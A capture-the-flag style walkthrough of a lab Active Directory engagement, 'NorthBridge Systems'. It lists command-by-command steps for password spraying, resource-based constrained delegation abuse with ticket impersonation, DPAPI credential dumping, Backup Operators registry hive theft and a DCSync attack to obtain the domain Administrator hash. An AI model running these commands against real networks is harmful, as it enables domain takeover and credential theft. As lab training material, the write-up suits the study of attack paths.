# NorthBridge Systems

## NorthBridge Systems (Hard)

![image.png](<../.gitbook/assets/image (1).png>)

### Objective / Scope

NorthBridge Systems is a managed service provider that has engaged the Hack Smarter Red Team to perform a security assessment against a portion of their environment. The assessment is to be conducted from an assumed breach perspective, as you have been provided credentials for a dedicated service account created specifically for this engagement.

Your point of contact at NorthBridge Systems has authorized testing on the following hosts. Any host outside this scope is considered out of scope and should not be accessed.

* NORTHDC01 (Domain controller)
* NORTHJMP01 (Jump box user by the IT team)

The primary objective of the security assessment is to compromise the domain controller `(NORTHDC01)` in order to demonstrate the effectiveness (or lack thereof) of the recent security hardening activities.

To track your progress in the assessment, there are flags located at `C:\Users\Administrator\Desktop` on each host.

As you progress through the environment, make sure to document these flags so your point of contact knows you have compromised the environment.

Your success in this assessment will directly inform their future cybersecurity budget! No pressure!

#### Starting Credentials

```bash
_securitytestingsvc:4kCc$A@NZvNAdK@
```

### Recon ,Scanning, and Enumeration

#### Rustscan - NORTHDC01 - `10.1.11.70`

RedBlue@Frank NorthBridge % `rustscan -b 500 -a ip.txt -- -sC -sV -Pn`

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-29 07:34:53Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Issuer: commonName=northbridge-NORTHDC01-CA/domainComponent=northbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T02:43:23
| Not valid after:  2026-09-21T02:43:23
| MD5:   de55:1fcf:d2e9:a4b5:59e9:b3a9:699b:b193
| SHA-1: 794d:3010:2a6b:4392:3a65:cebe:b3a9:8ee2:6c4b:a91e
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Issuer: commonName=northbridge-NORTHDC01-CA/domainComponent=northbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T02:43:23
| Not valid after:  2026-09-21T02:43:23
| MD5:   de55:1fcf:d2e9:a4b5:59e9:b3a9:699b:b193
| SHA-1: 794d:3010:2a6b:4392:3a65:cebe:b3a9:8ee2:6c4b:a91e

3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Issuer: commonName=northbridge-NORTHDC01-CA/domainComponent=northbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T02:43:23
| Not valid after:  2026-09-21T02:43:23
| MD5:   de55:1fcf:d2e9:a4b5:59e9:b3a9:699b:b193
| SHA-1: 794d:3010:2a6b:4392:3a65:cebe:b3a9:8ee2:6c4b:a91e

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:NORTHDC01.northbridge.corp
| Issuer: commonName=northbridge-NORTHDC01-CA/domainComponent=northbridge
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T02:43:23
| Not valid after:  2026-09-21T02:43:23
| MD5:   de55:1fcf:d2e9:a4b5:59e9:b3a9:699b:b193
| SHA-1: 794d:3010:2a6b:4392:3a65:cebe:b3a9:8ee2:6c4b:a91e

3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHDC01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHDC01.northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-29T07:35:45+00:00
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Issuer: commonName=NORTHDC01.northbridge.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-20T01:35:18
| Not valid after:  2026-03-22T01:35:18
| MD5:   75db:08a8:0e8c:4986:7798:1757:71b4:ff79
| SHA-1: ce09:b406:7157:b325:dd12:2e76:dbe1:c228:fde8:48ab

|_ssl-date: 2025-11-29T07:36:25+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55757/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
55769/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55785/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55802/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55993/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: NORTHDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

#### Rustscan - NORTHJMP01 - `10.1.136.48`

```bash
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=NORTHJMP01.northbridge.corp
| Issuer: commonName=NORTHJMP01.northbridge.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-20T02:38:29
| Not valid after:  2026-03-22T02:38:29
| MD5:   9268:33c0:235a:ef22:5a5f:32b7:3065:969e
| SHA-1: 7f5e:691d:8978:27c9:b78a:420c:5130:a320:7724:20d6
| rdp-ntlm-info: 
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHJMP01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHJMP01.northbridge.corp
|   DNS_Tree_Name: northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-29T07:34:04+00:00
|_ssl-date: 2025-11-29T07:34:44+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

* We identified a Windows host named `NORTHJMP01` on domain `northbridge.corp`

#### Generating host files

![image.png](<../.gitbook/assets/image 1 (3).png>)

* Added the above hosts to `/etc/hosts`

#### Initial access with provided creds

* Test access with `smb, rdp, winrm, ldap` etc.

Testing on `NORTHJMP01`

```bash
nxc smb NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' --shares
nxc ldap NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
nxc rdp NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
nxc winrm NORTHJMP01.northbridge.corp -u  _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
```

![image.png](<../.gitbook/assets/image 2 (2).png>)

* We have `Network shares` that is worthy being looked at later.

#### Testing other services

![image.png](<../.gitbook/assets/image 3 (2).png>)

* Can `rdp`

Testing on `NORTHDC01.northbridge.corp`

```bash
nxc smb NORTHDC01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' --shares
nxc ldap NORTHDC01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
nxc rdp NORTHDC01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
nxc winrm NORTHDC01.northbridge.corp -u  _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
```

![image.png](<../.gitbook/assets/image 4 (1).png>)

* We do not have interesting shares here yet.

#### Checking for quick wins

As best a practice, always check for the following:

* Enumerating other users
* Enumerating for pre-created computer accounts
* Enumerating for `certificate services`
* Enumerating for `ZeroLOgon`
* Enumerating for `Kerberoasting` and `AS-REP` - We can also get this from `Bloodhound`
* Enumerating for `gpp_autologin`

NB - Sometimes not necessary but worth digging into.

```bash
nxc smb NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' --rid-brute | grep 'SidTypeUser' 
nxc ldap NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' --users
nxc smb NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' --users

nxc ldap NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' -M pre2k
nxc ldap NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' -M adcs
nxc smb NORTHJMP01.northbridge.corp  -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' -M zerologon
nxc smb  NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@' -M gpp_autologin

```

#### Enumerating other users

![image.png](<../.gitbook/assets/image 5 (3).png>)

We have interesting output in our description `PAM-Managed KDC Service Accounts`

* likely **Privileged Access Management**
* automatically rotating passwords
* not requiring human intervention
* often used with _Just-In-Time admin_ or _Tiering_

The `svrautomationsvc` Used to support third-party security assessments - This account screams **consultant assessment account**, and these often have

* local admin rights
* remote desktop rights
* scheduled task permissions
* leftover privileges no one re-evaluated

Could be a pivot point.

#### Enumerating the `Network shares` from `NORTHJMP01`

![image.png](<../.gitbook/assets/image 6 (4).png>)

```bash
smbclient \\\\10.1.136.48\\"Network Shares" -U _securitytestingsvc

```

![image.png](<../.gitbook/assets/image 7 (4).png>)

* I was unable to view the share although i had READ permissions
*   When we tested for other services, we had a `Pwn3d!` on `rdp` and lets straight away authentic

    ![image.png](<../.gitbook/assets/image 8 (3).png>)

    ```bash
    xfreerdp3 /v:10.1.136.48 /u:_securitytestingsvc /p:'4kCc$A@NZvNAdK@' +clipboard /dynamic-resolution /drive:$(pwd),share
    ```

    ![image.png](<../.gitbook/assets/image 9 (3).png>)

![image.png](<../.gitbook/assets/image 10 (2).png>)

* We have 2 interesting directories here. `Network Shares & Scripts`
* Lets see what's inside of both

`Network Shares`

![image.png](<../.gitbook/assets/image 11 (3).png>)

* We have what seems to be a password `1rUlHB95TVA2I&BCve` and we can try to password spry.

![image.png](<../.gitbook/assets/image 12 (2).png>)

* This PowerShell script (`Get-DomainObjectDACL.ps1`) checks for **dangerous ACEs (permissions)** on the **Domain Object** in Active Directory

![image.png](<../.gitbook/assets/image 13 (3).png>)

* User & System Provisioning Checklist

![image.png](<../.gitbook/assets/image 14 (2).png>)

*   We can test for ADCS vulnerabilities

    ```bash
    certipy-ad find -u '_securitytestingsvc@northbridge.corp' -p '4kCc$A@NZvNAdK@' -dc-ip 10.1.11.70 -vulnerable 
    ```

    ![image.png](<../.gitbook/assets/image 15 (2).png>)

    * we did not find any, so this is now out of the way for now.

`Scripts`

![image.png](<../.gitbook/assets/image 16 (1).png>)

![image.png](<../.gitbook/assets/image 17.png>)

`Password.txt` file contains a DPAPI-encrypted Secure String

```bash
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000023053a472ff63e46b44a38e3ab85ce590000000002000000000003660000c000000010000000fdb7034a60b89eaa14c81eadc0a2e5740000000004800000a00000001000000009380983c9624b1cc4a64fa29dbeb6e428000000bbd040a75628fbddf267b0aec9526c1f8e8a461b0ac8bc52eec08364bb64b028ce259d837bef80c8140000003b193b86fbf049e8193aa3881a35e26ef4e8649e

```

![image.png](<../.gitbook/assets/image 18.png>)

* The backup process uses a **service account** that is a member of the **Backup Operators** group, requiring careful credential handling.
* A Task Scheduler job still uses this same account until it can be replace

![image.png](<../.gitbook/assets/image 19.png>)

![image.png](<../.gitbook/assets/image 20.png>)

*   In `C:\Scripts\Server Build Automation` we gathered some interesting findings

    * DomianJoinuser `_svrautomationsvc` and a DomainJoinpassword of `yf0@EoWY4cXqmVv`.
    *   We can test these credentials and also try and perform password spraying

        ```bash
        nxc smb 10.1.136.48 -u users.txt -p 'yf0@EoWY4cXqmVv' --continue-on-success
        ```

        ![image.png](<../.gitbook/assets/image 21.png>)

        * Perfomed password spraying and indeed the creds can authenticate user `_svrautomationsvc`
          * Interestingly, `erhodes` has a `STATUS_ACCOUNT_RESTRICTION` .This can mean that the password _is correct_, but logon is restricted (logon hours, workstation restrictions.

    With all that we have gathered so far, we can jump to BLOODHOUND.

### Bloodhound

We can use the provided creds `_svrautomationsvc:yf0@EoWY4cXqmVv` or `_securitytestingsvc:4kCc$A@NZvNAdK@` to obtain the loot

```bash
nxc ldap NORTHDC01.northbridge.corp -u '_svrautomationsvc' -p 'yf0@EoWY4cXqmVv' --bloodhound --collection All --dns-server  10.1.11.70
```

![image.png](<../.gitbook/assets/image 22 (1).png>)

#### Bloodhound enumeration

There is a lot we can find and do with bloodhound. My to-do is as below for quick wins

* Check All domain Admins
* Check for all Kerberoastable user accounts
* Find Shortest path to admin

All domain Admins

![image.png](<../.gitbook/assets/image 23.png>)

* `erhodesT0` is also a member of Domain Admins

![image.png](<../.gitbook/assets/image 24.png>)

* `_securitytestingsvc` doesn't have any interesting groups

![image.png](<../.gitbook/assets/image 25.png>)

* `_svrautomationsvc` has an outbound control to `NORTHJMP01.northbridge.corp`
* The user `_SVRAUTOMATIONSVC@NORTHBRIDGE.CORP` has `write rights` on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer NORTHJMP01.NORTHBRIDGE.CORP, among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting.

### Compromising NORTHJMP01

#### Abusing WriteAccountRestrictions ACE

First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's [addcomputer.py](http://addcomputer.py/) example script:

```bash
addcomputer.py -method LDAPS -computer-name 'RedBlue2$' -computer-pass 'RedBlue777' -dc-host NORTHDC01.northbridge.corp  -domain-netbios northbridge.corp 'northbridge.corp/_svrautomationsvc:yf0@EoWY4cXqmVv'
```

![image.png](<../.gitbook/assets/image 26 (1).png>)

* This means the account we are using has already reached the **maximum number of computers it’s allowed to join to the domain**
* By default, **any authenticated user** can add **10** machines to AD (ms-DS-MachineAccountQuota = 10). Some environments set it to **0**, meaning _no_ normal user can add computers.
*   Let me take you back to the findings we made above

    ![image.png](<../.gitbook/assets/image 27 (1).png>)

    * This script confirms exactly _why_ the `_svrautomationsvc` account exists, **what OU it can write to.**
    * The script assumes it is being executed by an account with **delegated permissions to create computer objects within the Servers OU.**
    * `_svrautomationsvc` has **explicit delegated rights** to create computer objects under `OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp`
    * So this means we can still `Create a Computer` but we just need to Specify the OU.

```bash
bloodyAD --host NORTHDC01.northbridge.corp -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' add computer --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' 'RedBlue2' 'RedBlue777'
```

![image.png](<../.gitbook/assets/image 28 (2).png>)

We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's [rbcd.py](http://rbcd.py/) script can be used for that purpose:

```bash
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'

rbcd.py -delegate-from 'RedBlue2$' -delegate-to 'NORTHJMP01$' -dc-ip '10.1.11.70' -action 'write' 'northbridge.corp'/'_svrautomationsvc':'yf0@EoWY4cXqmVv'
```

![image.png](<../.gitbook/assets/image 29 (2).png>)

And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's [getST.py](http://getst.py/) example script can be used for that purpose.

```bash
getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate erhodesT0 'northbridge.corp/RedBlue2$:RedBlue777' -dc-ip 10.1.11.70
```

![image.png](<../.gitbook/assets/image 30 (2).png>)

* Failed to impersonate with `erhodesT0`.
* We looked into other Admin accounts we can try to impersonate.

![image.png](<../.gitbook/assets/image 31 (2).png>)

![image.png](<../.gitbook/assets/image 32 (1).png>)

```bash
getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate RHALLT1 'northbridge.corp/RedBlue2$:RedBlue777' -dc-ip 10.1.11.70
```

![image.png](<../.gitbook/assets/image 33 (1).png>)

* Now that we have the `.ccache`, we can use it to access the CIFS service (SMB share) on `NORTHJMP01.`

```bash
export KRB5CCNAME=RHALLT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
```

#### Validating our ticket

```bash
nxc smb 10.1.136.48 --use-kcache
```

![image.png](<../.gitbook/assets/image 34 (1).png>)

#### Remote Command Execution

```bash
python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
    -k -no-pass NORTHJMP01.northbridge.corp

```

![image.png](<../.gitbook/assets/image 35 (1).png>)

### User flag

![image.png](<../.gitbook/assets/image 36 (1).png>)

## Escalating to `NORTHDC01`

* Let me take you back to our `script`
* We noticed that we have a service user `_backupsvc` which is a member of Backup operators
* Also the same account is still used by a task scheduler
* We then dump DPAPI Creds to get Creds for \_backupsvc then use the Backup operators priv escalation way

`Scripts`

![image.png](<../.gitbook/assets/image 16 (1).png>)

![image.png](<../.gitbook/assets/image 17.png>)

`Password.txt` file contains a DPAPI-encrypted Secure String

```bash
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000023053a472ff63e46b44a38e3ab85ce590000000002000000000003660000c000000010000000fdb7034a60b89eaa14c81eadc0a2e5740000000004800000a00000001000000009380983c9624b1cc4a64fa29dbeb6e428000000bbd040a75628fbddf267b0aec9526c1f8e8a461b0ac8bc52eec08364bb64b028ce259d837bef80c8140000003b193b86fbf049e8193aa3881a35e26ef4e8649e

```

![image.png](<../.gitbook/assets/image 18.png>)

* The backup process uses a **service account** that is a member of the **Backup Operators** group, requiring careful credential handling.
* A Task Scheduler job still uses this same account until it can be replace

![image.png](<../.gitbook/assets/image 37 (1).png>)

![image.png](<../.gitbook/assets/image 38 (1).png>)

![image.png](<../.gitbook/assets/image 39 (1).png>)

#### Dumping DPAPI Creds to get Creds for `_backupsvc`

```bash
nxc smb 10.1.136.48 --use-kcache --dpapi
```

![image.png](<../.gitbook/assets/image 40 (1).png>)

#### Testing the creds for `_backupsvc`

```bash
nxc smb 10.1.136.48 -u _backupsvc -p 'REDACTED'
```

![image.png](<../.gitbook/assets/image 41 (1).png>)

* Now that our creds are valid, we now need to dump Registry hives using nxc module for Backup operator to extract creds

```bash
nxc smb 10.1.11.70 -u _backupsvc -p 'REDACTED' -M backup_operator
```

![image.png](<../.gitbook/assets/image 42.png>)

*   For some reason, the SAM and SECURITY hives were successfully downloaded but not the SYSTEM

    ```bash
    python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
    northbridge.corp/_backupsvc:'REDACTED'@NORTHDC01.northbridge.corp

    ```

    ![image.png](<../.gitbook/assets/image 43.png>)

    ```bash
    secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

    ```

    ![image.png](<../.gitbook/assets/image 44.png>)

    * Retrieved `N**orthdc01$` machine account password\*\*.

![image.png](<../.gitbook/assets/image 45.png>)

* We can use `NORTHDC01` domain controller machine account to perform a DCSync attack.

### Performing a DCSync attack

```bash
secretsdump.py 'northbridge.corp/NORTHDC01$@northdc01.northbridge.corp' -hashes :'REDACTED' -just-dc-user Administrator
```

![image.png](<../.gitbook/assets/image 46.png>)

```bash
nxc smb 10.1.11.70 -u Administrator -H 'REDACTED'
```

![image.png](<../.gitbook/assets/image 47.png>)

```bash
python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
    northbridge.corp/Administrator@NORTHDC01.northbridge.corp \
    -hashes :'REDACTED'

```

### ROOT FLAG

![image.png](<../.gitbook/assets/image 48.png>)

![image.png](<../.gitbook/assets/image 49.png>)
